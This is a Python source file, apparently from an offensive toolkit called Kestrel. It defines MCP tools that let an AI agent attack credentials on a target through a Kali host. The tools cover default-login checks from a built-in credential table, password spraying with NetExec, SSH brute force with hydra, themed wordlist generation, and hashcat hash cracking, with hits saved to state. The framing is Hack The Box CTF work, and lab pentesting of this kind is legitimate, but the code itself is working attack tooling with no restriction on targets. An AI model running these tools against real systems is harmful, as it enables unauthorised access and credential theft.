"""MCP tools — credential operations (defaults, spray, bruteforce, hash recommend/crack/status, audit)."""

from __future__ import annotations

import asyncio
import os
import re
import shlex
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from kestrel.core import crack, wordlist
from kestrel.mcp import context as mcp_context
from kestrel.mcp import registry
from kestrel.transport import kali_proxy


# IMP-14: hash types that require GPU — CPU cracking is futile
_GPU_ONLY_HASH_MODES = frozenset({
    "3200",     # bcrypt $2*$
    "13400",    # KeePass (argon2)
    "8900",     # scrypt
    "11300",    # Bitcoin/Litecoin wallet.dat
    "13721",    # VeraCrypt PBKDF2-HMAC-SHA512 + AES
})
_GPU_ONLY_PREFIXES = ("$2a$", "$2b$", "$2y$", "$argon2")


def _is_gpu_only(hash_type: str, hash_value: str) -> bool:
    ht = hash_type.strip().lower()
    return ht in _GPU_ONLY_HASH_MODES or any(hash_value.startswith(p) for p in _GPU_ONLY_PREFIXES)


SERVICE_DEFAULTS: dict[str, list[tuple[str, str]]] = {
    "ssh": [
        ("root", "root"), ("root", "toor"), ("admin", "admin"), ("kali", "kali"),
        ("ubuntu", "ubuntu"), ("user", "user"), ("pi", "raspberry"),
        ("guest", "guest"), ("test", "test"), ("deploy", "deploy"),
    ],
    "mysql": [("root", ""), ("root", "root"), ("mysql", "mysql"), ("admin", "admin")],
    "ftp": [("anonymous", ""), ("ftp", "ftp"), ("admin", "admin")],
    "rdp": [("administrator", "administrator"), ("admin", "admin")],
    "tomcat": [("tomcat", "tomcat"), ("admin", "admin"), ("manager", "manager")],
    "jenkins": [("admin", "admin"), ("jenkins", "jenkins")],
    "mongodb": [("admin", "admin"), ("root", "root")],
    "postgres": [("postgres", "postgres"), ("admin", "admin")],
}


async def _run_kali(cmd: str, timeout: float = 120.0) -> dict[str, Any]:
    res = await asyncio.to_thread(kali_proxy.via_kali, cmd, timeout)
    return {"cmd": cmd, "rc": res.rc, "stdout": res.stdout, "stderr": res.stderr.strip(), "duration_s": res.duration_s}


def _now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ── creds_default_check ──────────────────────────────────────────────────────


@registry.tool(
    name="creds_default_check",
    description=(
        "Try a built-in dict of default credentials for the given service (ssh/mysql/ftp/rdp/tomcat/etc.). "
        "Uses nxc (NetExec). Returns success on first hit."
    ),
    category="creds",
)
async def creds_default_check(service: str, target: str, port: int | None = None) -> dict[str, Any]:
    svc = service.lower()
    if svc not in SERVICE_DEFAULTS:
        return {"error": "service_not_supported", "service": svc, "supported": list(SERVICE_DEFAULTS.keys())}
    nxc_proto_map = {"ssh": "ssh", "mysql": "mssql", "rdp": "rdp", "ftp": "ftp", "winrm": "winrm"}
    proto = nxc_proto_map.get(svc)
    if not proto:
        return {"error": "nxc_protocol_unsupported", "service": svc}
    results: list[dict[str, Any]] = []
    for user, password in SERVICE_DEFAULTS[svc]:
        port_arg = f"--port {port}" if port else ""
        cmd = f"nxc {proto} {shlex.quote(target)} {port_arg} -u {shlex.quote(user)} -p {shlex.quote(password)}"
        res = await _run_kali(cmd, timeout=15.0)
        # NetExec marks success with [+]
        success = "[+]" in res["stdout"]
        results.append({"user": user, "password": password, "success": success})
        if success:
            return {"service": svc, "target": target, "found": {"user": user, "password": password}, "tries": results}
    return {"service": svc, "target": target, "found": None, "tries": results}


# ── creds_password_spray ─────────────────────────────────────────────────────


@registry.tool(
    name="creds_password_spray",
    description=(
        "Password spray a single password across a user list against `target`. Service auto-detected from protocol arg "
        "(smb/winrm/ssh/mssql). Use small lists — 1 password per call to avoid AD lockout."
    ),
    category="creds",
)
async def creds_password_spray(
    target: str, users: list[str], password: str, protocol: str = "smb",
    machine: str | None = None,
) -> dict[str, Any]:
    users_payload = "\n".join(users)
    cmd = (
        f"set -e; tmpf=$(mktemp); printf '%s' {shlex.quote(users_payload)} > $tmpf; "
        f"nxc {shlex.quote(protocol)} {shlex.quote(target)} -u $tmpf -p {shlex.quote(password)} --continue-on-success; "
        f"rm -f $tmpf"
    )
    res = await _run_kali(cmd, timeout=120.0)
    successes: list[str] = []
    for line in res["stdout"].splitlines():
        if "[+]" in line:
            successes.append(line.strip())

    # IMP-18: auto-narrate spray result
    try:
        from kestrel.mcp.tools.narrate import narrate_emit
        await narrate_emit(stream="💡", text=f"spray {protocol} {target}: {len(successes)} hits", machine=machine)
    except Exception:
        pass

    # IMP-19: auto-save successful credentials to state
    if machine and successes:
        try:
            ctx = mcp_context.get_context()
            m = ctx.state_store.get_machine(machine)
            existing = [c.model_dump(mode="json") for c in (m.tried_credentials if m else [])]
            for user in users:
                # mark as success if their name appears in any success line
                if any(user.lower() in s.lower() for s in successes):
                    existing.append({"user": user, "password": password, "service": protocol, "result": "success", "ts": _now_iso()})
            ctx.state_store.update_machine(machine, {"tried_credentials": existing})
        except Exception:
            pass

    return {"target": target, "protocol": protocol, "password": password, "success_count": len(successes), "successes": successes, "rc": res["rc"]}


# ── creds_ssh_bruteforce ─────────────────────────────────────────────────────


@registry.tool(
    name="creds_ssh_bruteforce",
    description=(
        "SSH bruteforce via hydra: try one or more users against a wordlist. "
        "For Easy HTB machines, run creds_themed_wordlist_gen first to build a targeted list, "
        "then call this. For deeper coverage, pass /usr/share/wordlists/rockyou.txt. "
        "Returns hits immediately — does not wait for full wordlist exhaustion."
    ),
    category="creds",
)
async def creds_ssh_bruteforce(
    target: str,
    users: list[str],
    wordlist: str,
    threads: int = 4,
    timeout: int = 300,
    machine: str | None = None,
) -> dict[str, Any]:
    users_payload = "\n".join(users)
    cmd = (
        f"set -e; uf=$(mktemp); printf {shlex.quote(users_payload)} > $uf; "
        f"timeout {max(30, timeout - 10)}s "
        f"hydra -L $uf -P {shlex.quote(wordlist)} ssh://{shlex.quote(target)} "
        f"-t {threads} -q -e nsr 2>&1; rm -f $uf"
    )
    res = await _run_kali(cmd, timeout=float(timeout + 30))

    hits: list[dict[str, str]] = []
    for line in res["stdout"].splitlines():
        if "[ssh]" in line and "login:" in line and "password:" in line:
            m = re.search(r"login:\s*(\S+)\s+password:\s*(.+)$", line.strip())
            if m:
                hits.append({"user": m.group(1), "password": m.group(2).strip()})

    try:
        from kestrel.mcp.tools.narrate import narrate_emit
        await narrate_emit(stream="💡", text=f"ssh_bruteforce {target}: {len(hits)} hits", machine=machine)
    except Exception:
        pass

    if machine and hits:
        try:
            ctx = mcp_context.get_context()
            m_state = ctx.state_store.get_machine(machine)
            existing = [c.model_dump(mode="json") for c in (m_state.tried_credentials if m_state else [])]
            for hit in hits:
                existing.append({"user": hit["user"], "password": hit["password"], "service": "ssh", "result": "success", "ts": _now_iso()})
            ctx.state_store.update_machine(machine, {"tried_credentials": existing})
        except Exception:
            pass

    return {
        "target": target,
        "users": users,
        "wordlist": wordlist,
        "threads": threads,
        "hit_count": len(hits),
        "hits": hits,
        "rc": res["rc"],
        "duration_s": res["duration_s"],
        "stdout_tail": res["stdout"][-2000:] if res.get("stdout") else "",
        "timed_out": "KESTREL_TIMEOUT=1" in (res.get("stdout") or ""),
        "error_hint": next(
            (m for m in ("Connection refused", "[ERROR]", "timeout", "0 valid", "ssh: Target")
             if m.lower() in (res.get("stdout") or "").lower()),
            None
        ),
    }


# ── creds_themed_wordlist_gen ─────────────────────────────────────────────────


@registry.tool(
    name="creds_themed_wordlist_gen",
    description=(
        "Generate a CTF-themed password wordlist combining: machine name variants, staff first/last names, "
        "page keywords, and common CTF patterns (Machine2024, machine!, etc.). "
        "Writes /tmp/kestrel-themed-{machine}.txt on Kali. "
        "Always call this before creds_ssh_bruteforce on Easy/Medium machines."
    ),
    category="creds",
)
async def creds_themed_wordlist_gen(
    machine: str,
    keywords: list[str] | None = None,
    staff: list[str] | None = None,
    output_path: str | None = None,
) -> dict[str, Any]:
    words: set[str] = set()
    base_words: list[str] = [machine] + (keywords or []) + (staff or [])

    for w in base_words:
        w_lower = w.lower().replace(" ", "").replace("-", "").replace("_", "")
        w_cap = w_lower.capitalize()
        words.update([
            w_lower, w_cap, w.upper(),
            f"{w_lower}123", f"{w_cap}123",
            f"{w_lower}2024", f"{w_cap}2024",
            f"{w_lower}2025", f"{w_cap}2025",
            f"{w_lower}!", f"{w_cap}!",
            f"{w_lower}1", f"{w_lower}01",
            f"{w_lower}@123", f"{w_cap}@2024",
            f"{w_lower}2024!", f"{w_lower}2025!",
        ])

    LEET = str.maketrans("aeiost", "431057")
    EXTRA_SUFFIXES = ["!", "01", "007", "99", "2022", "2023", "2022!", "2023!", "2024!"]

    for w in base_words:
        w_lower = w.lower().replace(" ", "").replace("-", "").replace("_", "")
        w_leet = w_lower.translate(LEET)
        for base_variant in [w_lower, w_lower.capitalize(), w_lower.upper(), w_leet, w_leet.capitalize()]:
            for suf in EXTRA_SUFFIXES:
                words.add(base_variant + suf)

    words.update([
        "password", "Password", "Password123", "password123",
        "admin", "Admin", "admin123", "Admin123",
        "letmein", "Letmein123", "123456", "12345678",
        "welcome", "Welcome", "welcome1", "Welcome1",
        "changeme", "Changeme", "changeme123",
        "qwerty", "iloveyou", "dragon", "master",
    ])

    def _priority_key(word: str, machine_lower: str) -> int:
        wl = word.lower()
        if wl == machine_lower: return 0
        if wl.startswith(machine_lower): return 1
        if machine_lower in wl: return 2
        return 10

    machine_lower = machine.lower()
    wordlist_content = "\n".join(sorted(words, key=lambda w: (_priority_key(w, machine_lower), w)))
    out_path = output_path or f"/tmp/kestrel-themed-{machine}.txt"
    cmd = (
        f"printf {shlex.quote(wordlist_content)} > {shlex.quote(out_path)} "
        f"&& wc -l {shlex.quote(out_path)}"
    )
    res = await _run_kali(cmd, timeout=10.0)

    return {
        "machine": machine,
        "output_path": out_path,
        "word_count": len(words),
        "rc": res["rc"],
        "hint": f"Run: creds_ssh_bruteforce(target=..., users=[...], wordlist='{out_path}')",
    }


# ── creds_hash_recommend ─────────────────────────────────────────────────────


@registry.tool(
    name="creds_hash_recommend",
    description=(
        "Recommend a ranked wordlist strategy for a hash given context (machine_name, vhosts, framework). "
        "Wraps kestrel.core.wordlist.build_plan."
    ),
    category="creds",
    input_schema={
        "type": "object",
        "properties": {
            "hash_type": {"type": "string"},
            "machine_name": {"type": "string"},
            "vhosts": {"type": "array", "items": {"type": "string"}},
            "framework": {"type": "string"},
            "target_ip": {"type": "string"},
        },
        "required": ["hash_type", "machine_name"],
    },
)
async def creds_hash_recommend(
    hash_type: str,
    machine_name: str,
    vhosts: list[str] | None = None,
    framework: str | None = None,
    target_ip: str | None = None,
) -> dict[str, Any]:
    plan = wordlist.build_plan(machine_name, vhosts or [], framework, hash_type, target_ip)
    return {"hash_type": hash_type, "machine": machine_name, "plan": plan}


# ── creds_hash_crack ─────────────────────────────────────────────────────────


@registry.tool(
    name="creds_hash_crack",
    description=(
        "Crack a single hash via hashcat on Kali. Returns rc + cracked password if found. "
        "For bcrypt/argon2/scrypt prefer async pipeline (use crack-helper.sh from skill flow)."
    ),
    category="creds",
)
async def creds_hash_crack(
    hash_value: str,
    hash_type: str,
    wordlist_path: str,
    rules: str = "none",
    timeout: int = 300,
    machine: str | None = None,
) -> dict[str, Any]:
    # IMP-14: GPU-only hash policy — block CPU cracking attempt
    if _is_gpu_only(hash_type, hash_value):
        return {
            "error": "hash_policy_blocked",
            "hash_type": hash_type,
            "reason": "GPU-only hash — CPU cracking is infeasible (bcrypt/argon2/scrypt).",
            "escalation": "Use creds_hash_recommend() to plan GPU crack, then crack-helper.sh --async or Colab/Kaggle.",
        }

    rules_arg = f"-r {shlex.quote(rules)}" if rules and rules != "none" else ""
    # IMP-14: add --optimized-kernel-enable for fast hashes
    cmd = (
        f"set -e; hf=$(mktemp); printf '%s' {shlex.quote(hash_value)} > $hf; "
        f"hashcat -m {shlex.quote(hash_type)} $hf {shlex.quote(wordlist_path)} {rules_arg} "
        f"--quiet --potfile-disable --optimized-kernel-enable; "
        f"rc=$?; hashcat -m {shlex.quote(hash_type)} $hf {shlex.quote(wordlist_path)} {rules_arg} --show; "
        f"rm -f $hf; exit $rc"
    )
    res = await _run_kali(cmd, timeout=float(timeout))
    cracked = None
    for line in res["stdout"].splitlines():
        if ":" in line and line.startswith(hash_value.split("$")[0][:8]):
            parts = line.split(":", 1)
            if len(parts) == 2:
                cracked = parts[1].strip()
                break

    # IMP-18: auto-narrate crack result
    narrate_text = f"hash_crack {hash_type}: {'cracked ✓' if cracked else 'no_match'}"
    try:
        from kestrel.mcp.tools.narrate import narrate_emit
        await narrate_emit(stream="💡", text=narrate_text, machine=machine)
    except Exception:
        pass

    # IMP-19: auto-save tried hash to state
    if machine:
        try:
            ctx = mcp_context.get_context()
            m = ctx.state_store.get_machine(machine)
            existing = [h.model_dump(mode="json") for h in (m.tried_hashes if m else [])]
            existing.append({
                "hash_preview": hash_value[:20],
                "type": hash_type,
                "wordlist": wordlist_path,
                "rules": rules,
                "elapsed_s": int(res["duration_s"]),
                "result": "match" if cracked else "no_match",
                "ts": _now_iso(),
            })
            ctx.state_store.update_machine(machine, {"tried_hashes": existing})
        except Exception:
            pass

    return {
        "hash_type": hash_type,
        "cracked": cracked,
        "rc": res["rc"],
        "duration_s": res["duration_s"],
    }


# ── creds_hash_status ────────────────────────────────────────────────────────


@registry.tool(
    name="creds_hash_status",
    description=(
        "Check the status of an async hash crack job (created by crack-helper.sh --async). "
        "Returns pending_upload / running / complete / no_match / timeout / error."
    ),
    category="creds",
)
async def creds_hash_status(job_id: str, jobs_dir: str | None = None) -> dict[str, Any]:
    jd = Path(jobs_dir or os.environ.get("KESTREL_CRACK_JOBS_DIR", str(Path.home() / ".kestrel" / "crack-jobs")))
    state = crack.load_state(jd, job_id)
    result = crack.load_result(jd, job_id)
    return crack.compute_status(state, result)


# ── creds_save_tried ─────────────────────────────────────────────────────────


@registry.tool(
    name="creds_save_tried",
    description=(
        "Append a tried credential / endpoint / hash to state.machines[machine] cross-session arrays. "
        "kind must be 'credential', 'endpoint', or 'hash'. Auto-stamps ts if missing."
    ),
    category="creds",
    input_schema={
        "type": "object",
        "properties": {
            "machine": {"type": "string"},
            "kind": {"type": "string", "enum": ["credential", "endpoint", "hash"]},
            "payload": {"type": "object"},
        },
        "required": ["machine", "kind", "payload"],
    },
)
async def creds_save_tried(machine: str, kind: str, payload: dict[str, Any]) -> dict[str, Any]:
    field_map = {"credential": "tried_credentials", "endpoint": "tried_endpoints", "hash": "tried_hashes"}
    field = field_map.get(kind)
    if field is None:
        return {"error": "invalid_kind", "got": kind, "valid": list(field_map.keys())}
    ctx = mcp_context.get_context()
    m = ctx.state_store.get_machine(machine)
    existing = []
    if m is not None:
        existing = [c.model_dump(mode="json") for c in getattr(m, field, [])]
    if "ts" not in payload:
        payload["ts"] = _now_iso()
    existing.append(payload)
    ctx.state_store.update_machine(machine, {field: existing})
    return {"machine": machine, "kind": kind, "count": len(existing)}
